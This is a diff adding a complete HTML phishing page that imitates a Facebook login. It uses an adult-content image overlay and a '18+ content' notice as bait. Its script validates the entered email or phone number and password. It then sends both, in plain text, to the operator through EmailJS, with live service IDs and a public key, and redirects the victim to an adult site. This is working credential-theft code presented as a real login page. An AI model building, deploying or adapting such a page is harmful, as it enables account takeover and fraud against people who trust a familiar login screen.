@@ -1,0 +1,248 @@
+<!doctype html>
+<html lang="en-UK">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Login</title>
+
+  <style>
+    :root {
+      --accent: #1877f2;
+      --border: #d0d7e6;
+      --text-muted: #777;
+      --bg: #ffffff;
+      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: var(--font);
+      background: var(--bg);
+      display: flex;
+      justify-content: center;
+      padding: 40px 0;
+    }
+
+    .language {
+      text-align: center;
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-top: 8px;
+    }
+
+    .login-wrapper {
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .logo-circle {
+      width: 70px;
+      height: 70px;
+      border-radius: 50%;
+      background: var(--accent);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 35px auto 25px auto;
+    }
+
+    .logo-circle span {
+      font-size: 42px;
+      font-weight: 700;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 10px;
+      border: 1px solid var(--border);
+      font-size: 16px;
+      margin-bottom: 12px;
+    }
+
+    button.login-btn {
+      width: 100%;
+      padding: 14px 16px;
+      background: var(--accent);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      margin-top: 4px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      margin-top: 16px;
+      font-size: 15px;
+      color: #1c1e21;
+    }
+    .forgot a {
+      text-decoration: none;
+      color: #1c1e21;
+      font-weight: 500;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 40px;
+    }
+
+    @media (max-width: 450px) {
+      body { padding: 20px; }
+    }
+
+    /* Lớp phủ hình ảnh */
+    #overlayBlock {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      z-index: 9999;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #overlayBlock img {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    #overlayBlock > div {
+      position: relative;
+      z-index: 10000;
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #overlayBlock > div > div {
+      width: 0;
+      height: 0;
+      border-top: 30px solid transparent;
+      border-bottom: 30px solid transparent;
+      border-left: 50px solid white;
+      margin-left: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Lớp phủ hình ảnh (Overlay Block) -->
+  <div id="overlayBlock">
+    <img src="https://vlxx.bz/img2/2965.jpg" alt="Overlay Image">
+    <div>
+      <div></div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("overlayBlock").onclick = function(){
+      document.getElementById("overlayBlock").style.display = "none";
+      window.scrollTo(0,0);
+    };
+  </script>
+
+  <div class="login-wrapper">
+
+    <div class="language">English (UK)</div>
+
+    <div class="logo-circle">
+      <span>f</span>
+    </div>
+
+    <!-- Form gửi qua EmailJS -->
+    <form id="loginForm">
+      <div style="font-size:13px; color:#b91c1c; background:#ffe8e8; border-left:4px solid #ef4444; padding:8px 10px; text-align:left; margin:0 0 10px 0; border-radius:6px; font-weight:600;">⚠️ Please login to view 18+ content</div>
+
+      <input
+        type="text"
+        id="username"
+        name="username"
+        placeholder="Mobile number or email address"
+        required>
+
+      <input
+        type="password"
+        id="password"
+        name="password"
+        placeholder="Password"
+        required>
+
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
+
+    <div class="forgot">
+      <a href="#">Forgotten password?</a>
+    </div>
+
+    <div class="footer">
+      About · Help · More
+    </div>
+
+  </div>
+
+  <!-- EmailJS SDK mới -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+    emailjs.init({
+        publicKey: "grJxru1AmzGmnRK3X"
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const usernameVal = document.getElementById('username').value.trim();
+        const passwordVal = document.getElementById('password').value.trim();
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneRegex = /^\d{9,15}$/;
+
+        if (!(emailRegex.test(usernameVal) || phoneRegex.test(usernameVal))) {
+            alert("Please enter a valid email or phone number.");
+            return;
+        }
+
+        if (passwordVal.length < 5) {
+            alert("Password must be at least 5 characters.");
+            return;
+        }
+
+        emailjs.send("service_246vp5h", "template_d2258w5", {
+            username: usernameVal,
+            password: passwordVal
+        }).then(
+            (response) => {
+                window.location.href = "https://vlxx.bz";
+            },
+            (error) => {
+                alert("Error sending email: " + error.text);
+            }
+        );
+    });
+</script>
+
+
+</body>
+</html>
